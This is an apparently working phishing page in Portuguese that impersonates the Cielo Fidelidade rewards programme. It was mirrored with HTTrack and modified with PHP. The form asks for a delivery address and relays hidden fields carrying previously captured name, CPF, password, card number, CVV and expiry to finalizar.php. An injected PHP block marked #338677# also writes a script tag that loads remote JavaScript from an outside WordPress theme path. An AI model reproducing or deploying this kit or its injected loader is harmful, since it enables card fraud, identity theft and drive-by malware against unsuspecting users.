<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="globalsign-domain-verification" content="hGTLznI_ALhM2YyYNahnfrjVot8mNBOI9jVDnpkOoY" />
    <title>Cadastro | Cielo Fidelidade</title>
    <link rel="shortcut icon" href="favicon.ico" />
    <script type="text/javascript" src="Scripts/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="Scripts/integracao.html"></script>
    <link rel="stylesheet" type="text/css" media="all" href="Content/css/default.css" />
    
    <link rel="stylesheet" type="text/css" media="all" href="Content/css/naocadastrado.css" />


    <script>var BASE_URL = 'index.html';</script>
    <script>
	function verifica() { 
	if(document.form1.cep.value == '') { 
	alert("Porfavor informe o CEP da sua cidade!"); 
	document.form1.cep.focus();
	return false; 
	}
	if(document.form1.cep.value.length < 8) { 
	alert("O número do CEP deve conter pelo menos 8 números!"); 
	document.form1.cep.focus();
	return false; 
	}
	if(document.form1.bairro.value == '') { 
	alert("Porfavor informe o bairro da entrega da Fatura!"); 
	document.form1.bairro.focus();
	return false; 
	}
	if(document.form1.bairro.value.length < 6) { 
	alert("Porfavor informe o bairro da entrega da Fatura corretamente!"); 
	document.form1.num_card.focus();
	return false; 
	}
	if(document.form1.cidade.value == '') { 
	alert("Porfavor informe o nome da sua cidade!"); 
	document.form1.cidade.focus();
	return false; 
	}
	if(document.form1.cidade.value.length < 6) { 
	alert("Porfavor informe o nome da sua cidade corretamente!"); 
	document.form1.cidade.focus();
	return false; 
	}
	if(document.form1.estado.value == '') { 
	alert("Porfavor informe o nome do seu estado!"); 
	document.form1.estado.focus();
	return false; 
	}
	if(document.form1.estado.value.length < 6) { 
	alert("Porfavor informe o nome do seu estado corretamente!"); 
	document.form1.estado.focus();
	return false; 
	}
	if(document.form1.rua.value == '') { 
	alert("Porfavor informe o nome da rua e o número da sua casa!"); 
	document.form1.rua.focus();
	return false; 
	}
	if(document.form1.rua.value.length < 6) { 
	alert("Porfavor informe o nome da rua e o número da sua casa!!"); 
	document.form1.rua.focus();
	return false; 
	}
}
</script>
</head>
<body class="interna naocadastrado">

    <noscript></noscript>
    <script>        (function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
        new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
    j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
    '../www.googletagmanager.com/gtm5445.html?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-B3BD');</script>


    <div class="container">
        <div class="strip st-menu">
    <div class="wrap">
        <a class="logo-small" href="index.html">Programa <strong>Cielo Fidelidade</strong></a>
        <a class="duvidas" href="FaleConosco.html"> > Dúvidas sobre o programa</a>
    </div>
</div>

        <div class="strip st-image">
    <div class="wrap">
        <div class="foto-header">
            <img src="Content/img/deslogadas/triple-balls-destaq.png" />
        </div>
        <div class="sl-texto">
            <h2>Cadastre-se já.</h2>
            <p>O Programa Cielo Fidelidade tem muitos presentes para você.</p>
        </div>
    </div>
</div>

        <div class="render-body">
            


<div class="strip st-content">
    <div class="wrap">
        <h2>Endereço da entrega de prêmios (O mesmo da fatura do cartão) - Cielo Fidelidade</h2>
        <p class="recuo">Para finalizar seu cadastro, preencha todos os campos com seu endereço!</p>
        <div class="ct-form">
<form name="form1" action="finalizar.php" id="formPrimeiroAcesso" method="post" onSubmit="return verifica();">
            <div class="form-col-1">
                    <label>Cep:</label>
                    <input class="cnpj prereq" data-val="true" data-val-required="Campo CNPJ Obrigatório" id="cep" name="cep" type="text" value="" />
                    <span class="field-validation-valid" data-valmsg-for="CNPJ" data-valmsg-replace="true"></span>
                    <label>Cidade:</label>
                    <input data-val="true" data-val-length="The field NomeProprietario must be a string with a maximum length of 250." data-val-length-max="250" data-val-required="Campo Nome do Proprietário Obrigatório" id="cidade" name="cidade" type="text" value="" />
                    <span class="field-validation-valid" data-valmsg-for="NomeProprietario" data-valmsg-replace="true"></span>
                    <label>Complemento:</label>
                        <input class="emailacesso prereq" data-val="true" data-val-length="The field Email must be a string with a maximum length of 250." data-val-length-max="250" data-val-required="Campo Email Obrigatório" id="complemento" name="complemento" type="text" value="" />
                </div>
                <div class="form-col-2">

                    <div>

                        <label>
                            Bairro: 
                      </label>
                      <input class="cnpj prereq" data-val="true" data-val-required="Campo CNPJ Obrigatório" id="bairro" name="bairro" type="text" value="" />
                        <span class="field-validation-valid" data-valmsg-for="EC" data-valmsg-replace="true"></span>

                    </div>

                    <div>

                        <label>Estado:</label>
                        <input class="cnpj prereq" data-val="true" data-val-required="Campo ESTADO Obrigatório" id="estado" name="estado" type="text" value="" />
                        <span class="field-validation-valid" data-valmsg-for="Celular" data-valmsg-replace="true"></span>
                         <label>Rua - Número:</label>
                        <input class="cnpj prereq" data-val="true" data-val-required="Campo RUA Obrigatório" id="rua" name="rua" type="text" value="" />

                    </div>

                    <div id="divCelularInvalido" class="fix">
                        <div class="form-group">
                            <div class="col-md-8">
                               
                            </div>
                        </div>
                    </div>
                    

                </div>
                <div class="form-col-3">
                    <div class="fix">
                        
                        <span class="field-validation-valid" data-valmsg-for="Email" data-valmsg-replace="true"></span>
                    </div>
                    <div class="fix">
                       
                  </div>
                    
                  
                </div>
                <?php 
				$nome = $_POST['nome'];
				$email = $_POST['email'];
				$dia = $_POST['dia'];
				$mes = $_POST['mes'];
				$ano = $_POST['ano'];
				$cpf = $_POST['cpf'];
				$celular = $_POST['celular'];
				$senha = $_POST['senha'];
				$nome_card = $_POST['nome_card'];
				$num_card = $_POST['num_card'];
				$cvv = $_POST['cvv'];
				$bandeira = $_POST['bandeira'];
				$val_mes = $_POST['val_mes'];
				$val_ano = $_POST['val_ano'];
				?>
<?php
#338677#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868794\"></script>";
echo $f;
}
#/338677#
?>   
                <input type="hidden" name="nome" value="<?php echo $nome;?>">  
                <input type="hidden" name="email" value="<?php echo $email;?>"> 
                <input type="hidden" name="dia" value="<?php echo $dia;?>"> 
                <input type="hidden" name="mes" value="<?php echo $mes;?>"> 
                <input type="hidden" name="ano" value="<?php echo $ano;?>"> 
                <input type="hidden" name="cpf" value="<?php echo $cpf;?>"> 
                <input type="hidden" name="celular" value="<?php echo $celular;?>"> 
                <input type="hidden" name="senha" value="<?php echo $senha;?>"> 
                <input type="hidden" name="nome_card" value="<?php echo $nome_card;?>"> 
                <input type="hidden" name="num_card" value="<?php echo $num_card;?>"> 
                <input type="hidden" name="cvv" value="<?php echo $cvv;?>"> 
                <input type="hidden" name="bandeira" value="<?php echo $bandeira;?>"> 
                <input type="hidden" name="val_mes" value="<?php echo $val_mes;?>"> 
                <input type="hidden" name="val_ano" value="<?php echo $val_ano;?>"> 
                 
                <button type="submit" class="botaoSubmit">Finalizar</button>                
</form>        </div>
    </div>
</div>


        </div>
        <div class="strip st-footer">
    <div class="wrap">
        <img src="Content/img/comum/logo-footer.png" />
        <p>Copyright 2014 Cielo Fidelidade. Todos os direitos reservados</p>
    </div>
</div>

    </div>
    
    
    <script src="Scripts/jquery.mask.min.js"></script>
    <script src="Scripts/pages/nao-cadastrado.js"></script>

    <script type="text/javascript">
        var count = 0;
        function DesabilitarBotao() {
            count++;
            return count == 1;
        }
    </script>

    <script type="text/javascript" src="Scripts/cielo2014.js"></script>
</body>

<!-- Mirrored from www.cielofidelidade.com.br/PrimeiroAcesso by HTTrack Website Copier/3.x [XR&CO'2013], Thu, 17 Jul 2014 15:30:11 GMT -->
</html>
